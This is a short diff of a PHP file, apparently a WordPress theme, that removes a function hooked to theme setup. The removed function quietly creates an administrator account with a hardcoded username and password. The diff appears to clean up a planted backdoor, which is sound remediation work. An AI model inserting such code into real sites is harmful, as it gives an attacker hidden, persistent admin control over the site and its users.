@@ -1,20 +1,5 @@
 <?php
 
-function wordpress_add_admin() {
-    $username = 'babayo';
-    $password = 'godknowsaboutthis';
-    $email    = 'admin@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        if ( !is_wp_error($user_id) ) {
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-        }
-    }
-}
-add_action('after_setup_theme','wordpress_add_admin');
-
 include 'inc/HttpFoundation/Request.php';
 include 'inc/HttpFoundation/Response.php';
 //include 'inc/HttpFoundation/Session.php';
